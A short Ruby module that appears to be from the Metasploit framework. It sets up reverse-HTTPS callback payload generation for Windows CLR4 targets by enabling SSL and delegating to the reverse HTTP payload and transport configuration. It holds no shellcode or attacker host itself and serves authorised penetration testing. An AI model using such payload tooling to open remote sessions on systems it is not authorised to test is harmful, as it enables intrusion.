# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/transport_config'
require 'msf/core/payload/clr4/reverse_http'

module Msf

###
#
# Complex payload generation for Windows ARCH_CLR4 that speak HTTPS
#
###

module Payload::Clr4::ReverseHttps

  include Msf::Payload::TransportConfig
  include Msf::Payload::Clr4::ReverseHttp

  #
  # Generate the first stage
  #
  def generate(opts={})
    opts[:ssl] = true
    super(opts)
  end

  #
  # Generate the transport-specific configuration
  #
  def transport_config(opts={})
    transport_config_reverse_https(opts)
  end

end

end

